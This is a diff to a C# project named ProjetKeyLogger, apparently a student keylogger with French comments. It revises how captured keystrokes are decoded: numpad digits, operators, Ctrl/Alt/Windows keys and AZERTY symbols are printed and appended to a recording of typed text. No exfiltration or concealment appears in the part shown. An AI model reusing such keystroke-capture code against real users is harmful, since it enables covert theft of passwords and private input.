@@ -74,28 +74,10 @@ namespace ProjetKeyLogger
                     // on caste le nombre ascii en char
                    
                     if (statut_cle == 32769)
-                    {
-                                        
-                        //probleme du pavé numérique
-                        //le 1 correspond au code 97 c'est pour cela que l'on fait -96 à tous au lieu d'affecter une valeur à chaque nombre
-                        if (codeASCII>96 & codeASCII < 106)
-                        {
-                            Console.Write((int)codeASCII - 96);
-                          
-                        } else
-                        {//clavier des lettres : distinction majuscules ou non
-                            if (majuscule == false)
-                            {
-                                Console.Write(Char.ToLower((char)codeASCII) + ":" + codeASCII.ToString());
-                            }
-                            else
-                            {
-                                Console.Write(Char.ToUpper((char)codeASCII) );
-                            }
-                        }
-
+                    {                        
                         switch (codeASCII)
                         {
+                            
                             //Si touche Entrée
                             case 13:
                                 //Sinon on peut faire un console.writeline tout simplement ?
@@ -117,10 +99,64 @@ namespace ProjetKeyLogger
                                                                    
                                 break;
                             case 8:
-                            // enregistrement.effacerContenu();
-                            
+                                // enregistrement.effacerContenu();
+                                break;
+
+                            case 110:
+                                Console.Write(".");
+                                break;
+
+                            case 107:
+                                Console.Write("+");
+                                break;
+
+                            case 109:
+                                Console.Write("-");
+                                break;
+
+                            case 106:
+                                Console.Write("*");
+                                break;
+
+                            case 111:
+                                Console.Write("/");
+                                break;
+
+                            //A FAIRE : les ctrl; alt ctrl etc mais comment les representer ?
+                            case 17:
+                                Console.Write("[ctrl]");
+                                break;
+                            case 18:
+                                Console.Write("[alt]");
+                                break;
+                            case 91:
+                                Console.Write("[WINDOWS]");
+                                break;
+
                             default:
-                               
+                                //probleme du pavé numérique
+                                //le 0 correspond au code 96 c'est pour cela que l'on fait -96 à tous au lieu d'affecter une valeur à chaque nombre
+                                if (codeASCII > 95 & codeASCII < 106)
+                                {
+                                    Console.Write((int)codeASCII - 96);
+                                }
+                                else
+                                {//clavier des lettres : distinction majuscules ou non
+                                    if (majuscule == false)
+                                        //cas des caracteres speciaux au lieu des chiffres
+                                        if (codeASCII >47 & codeASCII < 58)
+                                        {
+                                            string valeurs="à&é\"'(-è_ç";
+                                            Console.Write(valeurs.Substring(codeASCII-48,1));
+                                        } else
+                                        {
+                                            Console.Write(Char.ToLower((char)codeASCII));
+                                        }
+                                    else
+                                    {
+                                        Console.Write(Char.ToUpper((char)codeASCII));
+                                    }
+                                }
                                 //Concatenation e la derniere touche tapée au contenu de l'enregistrement
                                 enregistrement.ajouterContenu((char)codeASCII);
                                 //Sinon on incrémente le nombre de caracteres tapé
